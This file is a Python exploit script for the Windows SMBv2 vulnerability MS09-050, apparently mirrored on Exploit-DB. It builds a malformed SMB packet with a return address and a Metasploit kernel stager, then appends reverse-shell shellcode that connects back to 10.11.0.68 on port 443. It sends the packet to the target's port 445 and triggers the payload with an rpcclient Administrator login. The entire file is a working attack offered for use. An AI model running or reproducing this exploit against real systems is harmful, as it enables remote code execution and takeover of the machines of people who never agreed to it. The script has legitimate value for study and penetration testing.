# EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py

#!/usr/bin/python
#This module depends on the linux command line program smbclient. 
#I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
#The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.
import tempfile
import sys
import subprocess
from socket import socket
from time import sleep
from smb.SMBConnection import SMBConnection


try:

	target = sys.argv[1]
except IndexError:
	print '\nUsage: %s <target ip>\n' % sys.argv[0]
	print 'Example: MS36299.py 192.168.1.1 1\n'
	sys.exit(-1)

#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.68 LPORT=443  EXITFUNC=thread  -f python

shell =  "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
shell += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shell += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shell += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shell += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shell += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shell += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shell += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shell += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shell += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shell += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shell += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
shell += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
shell += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0b\x00\x44\x68"
shell += "\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
shell += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
shell += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
shell += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
shell += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
shell += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
shell += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shell += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68"
shell += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
shell += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

host = target, 445

buff ="\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff+="\x72\x00\x00\x00\x00\x18\x53\xc8"
buff+="\x17\x02" #high process ID
buff+="\x00\xe9\x58\x01\x00\x00"
buff+="\x00\x00\x00\x00\x00\x00\x00\x00"
buff+="\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff+="\x04\x0d\xdf\xff"*25
buff+="\x00\x02\x53\x4d"
buff+="\x42\x20\x32\x2e\x30\x30\x32\x00"
buff+="\x00\x00\x00\x00"*37
buff+="\xff\xff\xff\xff"*2
buff+="\x42\x42\x42\x42"*7
buff+="\xb4\xff\xff\x3f" #magic index
buff+="\x41\x41\x41\x41"*6
buff+="\x09\x0d\xd0\xff" #return address

#stager_sysenter_hook from metasploit

buff+="\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff+="\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff+="\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff+="\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff+="\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff+="\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff+="\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff+="\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff+="\x68\x76\x01\x00\x00\x59\x89\xd8"
buff+="\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff+="\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff+="\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff+="\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff+="\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff+="\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff+="\x83\xc2\x04\x81\x22\xff\xff\xff"
buff+="\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff+="\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff+="\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff+="\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff+="\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff+="\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff+="\x73\x75\x15\xe8\x07\x00\x00\x00"
buff+="\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff+="\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff+="\x61\xc3\x81\xc4\x54\xf2\xff\xff"

buff+=shell

s = socket()
s.connect(host)
s.send(buff)
s.close() 
#Trigger the above injected code via authenticated process.
subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)